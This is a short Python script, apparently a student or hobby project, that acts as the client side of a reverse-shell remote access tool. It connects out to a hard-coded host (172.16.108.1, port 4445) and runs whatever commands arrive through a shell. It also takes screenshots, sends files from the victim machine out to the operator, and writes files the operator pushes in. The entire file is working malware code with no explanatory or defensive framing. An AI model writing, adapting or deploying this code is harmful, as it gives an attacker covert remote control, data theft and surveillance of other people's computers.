import socket
import subprocess
import random
import string
from subprocess import CalledProcessError
import os
import time

def send_picture(file_name):
    send = open(file_name,"rb")
    size = os.path.getsize(file_name)
    data = send.read(size)
    hey.send(data)
    send.close()
    time.sleep(0.2)
    hey.send("Done!".encode())
def send_file(file_name):
    send = open(file_name,"r")
    data = send.read(1024).encode()
    while data:
        hey.send(data)
        data = send.read(1024)
    send.close()

hey = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
hey.connect(("172.16.108.1", 4445))

output = ""


while True:
    command = hey.recv(1024).decode()
    if command.casefold() == "exit":
        break
    elif command.startswith("cd "):
        try:
            os.chdir(command.strip("cd").strip(" "))
            hey.send("success!".encode())
        except FileNotFoundError as e:
            hey.send("File not found!".encode())
    elif command == "screenshot":
        file_name  = ""
        for x in range(20):
            file_name += random.choice(string.ascii_letters+string.digits)
        file_name += ".png"
        doomsday = subprocess.Popen(f"gnome-screenshot -f {file_name}",shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output,err = doomsday.communicate()
        if output == "bash: gnome-screenshot: command not found":
            doomsday = subprocess.Popen(f"xfce4-screenshooter --fullscreen -s {file_name}",shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output,err = doomsday.communicate()
            if output == "bash: xfce4-screenshooter: command not found":
                hey.send("The desktop environment is not gnome or xfce4....".encode())
            else:
                send_picture(file_name)
                time.sleep(0.5)
                subprocess.Popen(f"rm {file_name}",shell=True)
                
        else:
            send_picture(file_name)
            time.sleep(0.5)
            subprocess.Popen(f"rm {file_name}",shell=True)
            
    elif command.startswith("Sending"):
        filee = open(command.strip("Sending").strip(" "),"w+")
        time.sleep(0.5)
        while True:
            output = []
            message = hey.recv(1024)
            hello = len(message)
            if len(message) < 1024:
                output += "".join(map(chr, message)).split("\n")
                break
            output += "".join(map(chr, message)).split("\n")
        for x in output:
            filee.write(x + "\n")
        filee.close()
    elif command.startswith("get"):
        filee = command.strip("get ")
        if os.path.exists(filee):
            hey.send("True".encode())
            send_file(filee)
        else:
            hey.send("False".encode())
    else:
        try:
            doomsday = subprocess.Popen(command,shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output,err = doomsday.communicate()
            if output == b"" and not command.startswith("rm") and not command.startswith("mv") and not command.startswith("cp"):
                output = f"{command} is invalid!"
                hey.send(output.encode())
            else:
                hey.send(output)
        except CalledProcessError as e:
            hey.send(str(e).encode())
        
    
hey.close()
